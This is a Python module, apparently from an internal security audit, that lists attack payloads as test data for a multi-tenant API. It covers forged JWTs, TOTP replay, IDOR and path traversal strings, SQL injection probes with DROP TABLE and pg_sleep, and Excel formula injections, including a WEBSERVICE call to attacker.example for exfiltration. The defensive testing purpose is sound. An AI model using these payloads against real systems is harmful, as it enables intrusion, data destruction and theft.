"""Vektor serangan Wave 1 — DATA murni & deterministik (api-w1 §2, §5).

Kategori (sesuai target audit Hari 11):
- bypass `mfa_challenge_token` ke endpoint bisnis (scope=mfa_pending);
- TOTP replay (kode sama dipakai ulang — anti-replay step);
- IDOR `switch-company` ke company ilegal;
- kebocoran lintas `company_id` (tenant isolation);
- SQL injection pada dynamic `filter` AST;
- Excel formula injection (`=cmd|...`, CWE-1236).

TIDAK ada eksekusi/jaringan/IO di layer ini; pengiriman dilakukan test/
lewat infrastructure dengan Rules of Engagement (target lokal, request
dibatasi `soc_config.max_requests_per_test`).
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import struct
import time
from dataclasses import dataclass
from typing import Any, Mapping, Sequence

_FAR_FUTURE_EXP = 4102444800
_PAST_EXP = 1_600_000_000

BUSINESS_ENDPOINTS: tuple[str, ...] = (
    "/api/v1/me/navigation",
    "/api/v1/assets",
    "/api/v1/licenses",
    "/api/v1/tickets",
    "/api/v1/dcim/racks",
    "/api/v1/ipam/prefixes",
)

FORBIDDEN_SWITCH_PAYLOADS: tuple[str, ...] = (
    "bukan-uuid",
    "",
    "00000000-0000-0000-0000-000000000000",
    "'; DROP TABLE user_company_access; --",
    "../../etc/passwd",
)


# --- JWT crafting (bypass) ----------------------------------------------------


def _b64(segment: Mapping[str, Any]) -> str:
    raw = json.dumps(segment, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


@dataclass(frozen=True)
class ForgedToken:
    label: str
    token: str
    note: str


def forged_challenge_tokens() -> tuple[ForgedToken, ...]:
    """Token palsu yang mencoba lolos sebagai challenge MFA (`scope=mfa_pending`)."""
    pending_claims = {
        "sub": "soc-probe",
        "scope": "mfa_pending",
        "exp": _FAR_FUTURE_EXP,
    }
    garbage_sig = base64.urlsafe_b64encode(b"\x00" * 16).rstrip(b"=").decode()
    return (
        ForgedToken(
            "alg-none-pending",
            f"{_b64({'alg': 'none', 'typ': 'JWT'})}.{_b64(pending_claims)}.",
            "JWT alg:none klaim scope=mfa_pending (CWE-347)",
        ),
        ForgedToken(
            "hs256-forged-sig",
            f"{_b64({'alg': 'HS256', 'typ': 'JWT'})}.{_b64(pending_claims)}.{garbage_sig}",
            "JWT HS256 dengan signature sampah (verifikasi wajib gagal)",
        ),
        ForgedToken(
            "expired-challenge",
            f"{_b64({'alg': 'HS256', 'typ': 'JWT'})}."
            f"{_b64({'sub': 'soc-probe', 'scope': 'mfa_pending', 'exp': _PAST_EXP})}.{garbage_sig}",
            "challenge kadaluarsa (TTL 5 menit) wajib ditolak",
        ),
        ForgedToken(
            "scope-confusion",
            f"{_b64({'alg': 'HS256', 'typ': 'JWT'})}."
            f"{_b64({'sub': 'soc-probe', 'scope': 'access', 'exp': _FAR_FUTURE_EXP})}.{garbage_sig}",
            "klaim scope=access dipalsukan sebagai challenge",
        ),
    )


# --- TOTP replay ---------------------------------------------------------------

STEP_SECONDS = 30


def totp_code(secret: str, at_unix: float | None = None) -> str:
    """TOTP RFC 6238 (SHA1, 6 digit) — identik perilaku authenticator."""
    normalized = secret.strip().replace(" ", "").upper()
    padding = "=" * (-len(normalized) % 8)
    key = base64.b32decode(normalized + padding)
    moment = time.time() if at_unix is None else at_unix
    counter = int(moment // STEP_SECONDS)
    digest = hmac.new(key, struct.pack(">Q", counter), hashlib.sha1).digest()
    offset = digest[-1] & 0x0F
    code = (
        struct.unpack(">I", digest[offset : offset + 4])[0] & 0x7FFFFFFF
    ) % 10**6
    return str(code).zfill(6)


def replay_otp(secret: str, at_unix: float | None = None) -> tuple[str, str]:
    """Kode yang SAMA dua kali — payload replay (kode pertama dipakai attacker)."""
    code = totp_code(secret, at_unix)
    return code, code


# --- SQL injection pada filter AST ---------------------------------------------


@dataclass(frozen=True)
class FilterProbe:
    probe_id: str
    filter_ast: Mapping[str, Any]
    note: str


def filter_ast_sql_injection(foreign_company_id: str = "00000000-0000-0000-0000-000000000000") -> tuple[FilterProbe, ...]:
    """Probe SQLi & parser-abuse untuk `GET /items/{collection}?filter=...`."""
    deep: Mapping[str, Any] = {"field": "name", "op": "eq", "value": "x"}
    for _ in range(10):  # kedalaman 10 > batas 8
        deep = {"and": [dict(deep)]}
    flood = {"or": [{"field": "name", "op": "eq", "value": f"v{i}"} for i in range(80)]}
    return (
        FilterProbe("SQLI-TAUTOLOGY", {"and": [{"field": "name", "op": "eq", "value": "' OR '1'='1' --"}]}, "tautology string"),
        FilterProbe("SQLI-STACKED", {"and": [{"field": "name", "op": "eq", "value": "'; DROP TABLE dyn_items; --"}]}, "stacked query"),
        FilterProbe("SQLI-PGSLEEP", {"or": [{"field": "name", "op": "like", "value": "1'; SELECT pg_sleep(10); --"}]}, "time-based"),
        FilterProbe("SQLI-UNION", {"and": [{"field": "name", "op": "eq", "value": "1 UNION SELECT NULL, version() --"}]}, "union select"),
        FilterProbe("SQLI-FIELD-INJECT", {"field": "name; DROP TABLE dyn_items", "op": "eq", "value": "x"}, "injeksi identifier field"),
        FilterProbe("SQLI-OP-INJECT", {"and": [{"field": "name", "op": "eq; DROP TABLE dyn_items", "value": "x"}]}, "injeksi operator"),
        FilterProbe("SQLI-COMMENT-KEY", {"field": "name", "op--": "eq", "value": "x"}, "kunci AST asing"),
        FilterProbe("CROSS-TENANT-FIELD", {"and": [{"field": "company_id", "op": "eq", "value": foreign_company_id}]}, "field tenant tidak terdaftar"),
        FilterProbe("AST-DEPTH-OVERFLOW", deep, "kedalaman > 8"),
        FilterProbe("AST-NODE-FLOOD", flood, "node > 64"),
        FilterProbe("AST-OPERATOR-UNKNOWN", {"and": [{"field": "name", "op": "=(SELECT 1)", "value": "x"}]}, "operator tidak dikenal"),
        FilterProbe("AST-JSONB-ABUSE", {"and": [{"field": "name", "op": "eq", "value": {"$ne": None}}]}, "operator mongo-style pada value"),
    )


SQL_ERROR_MARKERS: tuple[str, ...] = (
    "syntax error",
    "psql:",
    "postgres",
    "relation \"",
    "unterminated",
    "panic",
    "panicked at",
    "backtrace",
)


# --- Excel formula injection ----------------------------------------------------

FORMULA_INJECTION_CELLS: tuple[tuple[str, str], ...] = (
    ("asset_tag", "=cmd|'/C calc'!A0"),
    ("name", "+1+cmd|'/C calc'!A0"),
    ("serial_number", "@SUM(1+1)"),
    ("hostname", "=WEBSERVICE(\"https://attacker.example/exfil\")"),
    ("model_name", "-2+3||' )"),
)

DANGEROUS_LEADING_CHARS = ("=", "+", "-", "@", "\t", "\r")
